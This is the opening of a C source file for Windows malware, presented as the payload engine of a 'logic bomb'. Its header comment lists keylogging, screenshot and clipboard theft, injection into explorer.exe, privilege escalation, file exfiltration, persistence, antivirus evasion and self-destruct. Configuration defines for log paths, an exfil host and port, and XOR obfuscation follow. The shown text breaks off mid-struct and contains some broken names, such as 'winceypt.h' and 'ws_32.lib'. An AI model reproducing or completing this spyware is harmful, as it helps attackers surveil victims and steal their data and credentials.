/*
 * lb_payload.c
 * Platform  : Windows 7+ (x86/x64)
 * Compiler  : MinGW gcc / MSVC cl
 * Build     : gcc logic_bomb.c lb_payload.c -o logic_bomb.exe
 *             -lws2_32 -ladvapi32 -lshell32 -lgdi32 -luser32
 * Role      : Advanced payload engine — called by logic_bomb.c after trigger.
 *             Provides: anti-forensics, memory injection, privilege escalation,
 *             keylogging, screenshot capture, clipboard harvest, file exfil,
 *             persistence layer 2, self-destruct.
 *
 * GOTCHAS:
 *   gdi32   — GDI screenshot APIs (BitBlt, CreateCompatibleDC)
 *   user32  — keyboard hook, clipboard, desktop APIs
 *   advapi32 — token manipulation, registry, crypto APIs
 *   ntdll   — NtQueryInformationProcess loaded at runtime (no import lib needed)
 *   All function pointers to ntdll/undocumented APIs resolved via GetProcAddress
 *   to avoid static import that AV flags trivially.
 */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0A00  /* Windows 10 / 11 minimum */
#include <windows.h>
#include <winsock2.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <winceypt.h>
#include <gdiplus.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#pragma comment(lib, "ws_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "crypt32.lib")

/* ─── Public header (inline — no separate .h needed for single-module build) ── */
void payload_run(void);


/* ─── Internal limits ────────────────────────────────────────────────────────── */
#define MAX_PATH_X        1024
#define LOG_DIR           "C:\\ProgramData\\wuh\\"
#define KEYLOG_FILE       LOG_DIR "kl.dat"
#define SCREEN_FILE       LOG_DIR "sc_%04d%02d%02d_%02d%02d%02d.bmp"
#define CLIP_FILE         LOG_DIR "cb.dat"
#define EXFIL_HOST        "127.0.0.1"
#define EXFIL_PORT        5555
#define EXFIL_CHUNK       4096
#define INJECT_TARGET     "explorer.exe"
#define SCREENSHOT_EVERY  300        /* seconds between screenshots */
#define KEYLOG_FLUSH      60         /* seconds between keylog flushes */
#define XOR_KEY           0xAB       /* single-byte XOR for log obfuscation */

/* ─── Runtime NT types (avoid ntdll import lib) ─────────────────────────────── */
typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((s) >= 0)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
}